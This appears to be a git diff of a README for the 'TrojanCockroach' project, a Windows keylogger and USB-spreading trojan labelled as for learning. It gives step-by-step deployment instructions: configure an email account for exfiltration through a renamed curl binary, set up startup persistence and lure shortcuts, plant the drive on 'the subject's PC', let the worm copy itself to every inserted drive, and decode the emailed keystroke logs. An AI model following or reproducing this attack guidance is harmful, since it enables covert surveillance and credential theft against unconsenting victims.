@@ -9,12 +9,18 @@
 This project is created only for learning purpose.
 
 ### Setup
-1. Preparation
-  1. Change **getRandomName()** and **sendData()** method of **TrojanCockroach.cpp** according to your wish.
-  2. Compile **TrojanCockroach.cpp** & **Infect.cpp** (do not rename them).
-  3. Place **TrojanCockroach.exe**, **Infect.exe**, **---**, **---** & **---** in the same folder.
-  4. Now run **TrojanCockroach.exe**.
-  5. Then insert a pendrive in your PC (see the magic!).
+1. Intro
+  - [TrojanCockroach.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.cpp)- logs user's data, sends data through Transmit.exe, infects portable drive.
+  - [Infect.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.cpp)- installs the virus into computer.
+  - [Transmit.exe](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Transmit.exe)-  emails data back.
+  - [TrojanCockroach.lnk](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/TrojanCockroach.lnk)- resides in the startup folder of PC and activates TrojanCockroach.exe.
+  - [Infect.lnk](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/Infect.lnk)- takes different attractive names in the infected portable drive, activates Infect.exe when clicked.
+  - [DecodeMessage.cpp](https://github.com/MinhasKamal/TrojanCockroach/blob/master/com/minhaskamal/trojanCockroach/DecodeMessage.cpp)- used to decode received email.
+
+2. Preparation
+  1. Change the method **sendData()** of TrojanCockroach.cpp- place your email and password in the command.
+  2. Compile **TrojanCockroach.cpp** & **Infect.cpp**. **Transmit.exe** is actually the executable distribution of (curl)[https://curl.haxx.se] for Windows.
+  3. Place **TrojanCockroach.exe**, **Infect.exe**, **Transmit.exe**, **Infect.lnk** & **TrojanCockroach.lnk** in the same folder.
   
   Here, I have changed all the file names (you do not wish to keep these- 'TrojanCockroach', 'Infect'; right? the code will need to be changed a little too) and this is how they look-
   
@@ -22,18 +28,20 @@ This project is created only for learning purpose.
     <img src="https://cloud.githubusercontent.com/assets/5456665/18255358/cbaf8484-73ca-11e6-99a0-a5a52f65f8a0.PNG" alt="Key-Logger"/>
   </div>
 
-2. Attack
+  4. Now run **TrojanCockroach.exe** and insert a pendrive (see the magic!). You will get a hidden folder and link file in your pendrive. The hidden folder contains the full package, & the link file is actually renamed form of Infect.lnk.
+  
+3. Attack
   1. Now, insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!)
-  2. Run the shortcut and the spyware will be injected. Now (after a restart) everytime any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the circle will start again!
+  2. Run the shortcut and the spyware will be injected. Now (after a restart) every time any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the cycle will start again!
 
-3. Data Collection
+4. Data Collection
   1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
-  2. After getting the email copy the full message to a text file. As the the message has come through email certain characters are converted. To resolve that --- --- ---.
-  3. Now, run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
+  2. After getting the email copy the full message to a text file. As the message has come through email certain characters are converted. To resolve that --- --- ---. 
+  3. Now, run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming). 
 
-You can get a more clear understanding of the project from its pre-project- **[StupidKeyLogger](https://github.com/MinhasKamal/StupidKeyLogger)**.
+You may read (TrojanCockroachStory)[https://github.com/MinhasKamal/TrojanCockroach/blob/master/TrojanCockroachStory.md] to get an overview of how it works. You will get a more clear understanding of the project from its pre-project- **[StupidKeyLogger](https://github.com/MinhasKamal/StupidKeyLogger)**.
 
-**Note:** I do not want newbies to abuse my project, so I am **not revealing all the secrets**. There are also some intentionally created holes in this 'README'. I have also made some nonsense changes in the code, so that no one can run it effectively without getting his hands dirty.
+**Note:** I do not want newbies to abuse my project, so I am **keeping some simple secrets unrevealed**. There are also some intentionally created holes in this 'README'. I have made some nonsense changes in the code too, so that no one can run it effectively without getting his hands dirty.
 
 I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this.
 
